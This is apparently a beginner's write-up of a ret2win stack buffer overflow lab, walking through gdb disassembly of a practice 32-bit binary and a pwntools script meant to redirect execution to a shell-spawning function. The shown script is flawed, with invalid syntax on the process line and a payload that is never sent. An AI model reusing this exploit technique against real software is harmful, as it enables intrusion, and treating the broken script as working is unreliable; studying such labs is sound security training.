!![vuln](screenshots/vuln32(1).png)

https://github.com/ishwar2000/You_Tube/tree/main/Stack_Buffer_Overflow/1

so here we got a c program to overflow,as we can see here we need to access the hackrich function in order to access the shell.So lets open gdb and see what we can get from there.

```bash
❯ file vul32
vul32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=eecc7a47756955b6423845e714486ab1e218a19d, for GNU/Linux 3.2.0, not stripped
```
here we check the file type and architecture of the file and it is 32 bit.
we can use checksec to see what protection it used but we dont need for this problem as it is a ret2win kindsa challenge(idk if its right or wrong im new)

so we open gdb to gatehr some info about buffer+ebp.
```bash
❯ gdb -q vul32
Reading symbols from vul32...
(No debugging symbols found in vul32)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  __libc_start_main@plt
0x08049040  gets@plt
0x08049050  puts@plt
0x08049060  system@plt
0x08049070  _start
0x080490a0  _dl_relocate_static_pie
0x080490b0  __x86.get_pc_thunk.bx
0x080490c0  deregister_tm_clones
0x08049100  register_tm_clones
0x08049140  __do_global_dtors_aux
0x08049170  frame_dummy
0x08049176  hackrich
0x080491b2  foo
0x080491eb  main
0x08049203  __x86.get_pc_thunk.ax
0x08049208  _fini
```

here we can get hackrich function address which is 0x08049176 for future reference,lets disassemble main and foo.

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080491eb <+0>:     push   ebp
   0x080491ec <+1>:     mov    ebp,esp
   0x080491ee <+3>:     and    esp,0xfffffff0
   0x080491f1 <+6>:     call   0x8049203 <__x86.get_pc_thunk.ax>
   0x080491f6 <+11>:    add    eax,0x2dfe
   0x080491fb <+16>:    call   0x80491b2 <foo>
   0x08049200 <+21>:    nop
   0x08049201 <+22>:    leave
   0x08049202 <+23>:    ret
End of assembler dump.
```
not much happening in main fucntion as it just calls for foo function,so lets disassemble foo to see what happens there.

```bash
(gdb) disas foo
Dump of assembler code for function foo:
   0x080491b2 <+0>:     push   ebp
   0x080491b3 <+1>:     mov    ebp,esp
   0x080491b5 <+3>:     push   ebx
   0x080491b6 <+4>:     sub    esp,0x34
   0x080491b9 <+7>:     call   0x80490b0 <__x86.get_pc_thunk.bx>
   0x080491be <+12>:    add    ebx,0x2e36
   0x080491c4 <+18>:    sub    esp,0xc
   0x080491c7 <+21>:    lea    eax,[ebx-0x1fd7]
   0x080491cd <+27>:    push   eax
   0x080491ce <+28>:    call   0x8049050 <puts@plt>
   0x080491d3 <+33>:    add    esp,0x10
   0x080491d6 <+36>:    sub    esp,0xc
   0x080491d9 <+39>:    lea    eax,[ebp-0x30]
   0x080491dc <+42>:    push   eax
   0x080491dd <+43>:    call   0x8049040 <gets@plt>
   0x080491e2 <+48>:    add    esp,0x10
   0x080491e5 <+51>:    nop
   0x080491e6 <+52>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491e9 <+55>:    leave
   0x080491ea <+56>:    ret
End of assembler dump.
```
we see the starts for lea function,it like *Just give me the address ebp-0x30 — I don’t care what’s stored there*,so it loads the address in eax and then eax got push in the stack.so lets examine how many buffer it hold in (ebp-0x30)
As we know ebp aka baso pointer hold up to 4 buffer/char so now we ned to know how much does 0x30 buffer hold its value.
```python
❯ python3
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x30
48
```

so in python we got 48 buffer it holds,that is hwy it is important to check in the gdb itself on how many buffer it hold as the source code itself says that it hold only 40 buffer in char buffer(40)

so lets write our payload to go the the hackrich function and get the shell!
we can use padding like A*48(buffer)+B*4(EBP)+0x08049176(hackrich function) or u can write any 4 character in ebp because our goal to overwrite it,like u could go print A*52(48+4)+0x08049176(return address) any u prefer.
but in little endian(because the file in 32-bit) we need to reverse the order of the bytes to /x76/x91/x04/x08 like this or in pwntools script just type p32(0x08049176) to reverse the bytes for us.
so the full script will be like the following

```python
from pwn import *

p.process(./vul32) #specify the file

print(p.recv())#it receive the file

padding = b'A' * 48 + b'B' * 4 #our padding to overwrite the buffer
ret_address = p32(0x08049176) #our return pointer when our padding have overwrite the buffer

print(p.clean())

p.interactive()#this will let us have shell interaction
```

![we have our shell](screenshots/vuln32(shell).png)

run the script and we successfully exploit the system to ret to our prefer address and spawn the shell!
Classic ret2win: hijack the control flow by exploiting an overflow to call a function already present in the binary.